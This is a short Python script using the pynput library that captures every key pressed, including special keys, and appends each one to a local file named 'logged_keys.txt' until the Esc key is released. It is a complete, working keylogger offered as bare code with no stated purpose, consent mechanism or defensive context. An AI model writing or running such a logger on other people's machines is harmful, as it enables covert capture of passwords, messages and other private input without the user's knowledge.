from pynput import keyboard

def on_press(key):
    try:
        with open('logged_keys.txt','a') as f:
            f.write(f'Key Pressed: {key.char}\n')
    except AttributeError:
        with open('logged_keys.txt','a') as f:
            f.write(f'Special Key Pressed: {key}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()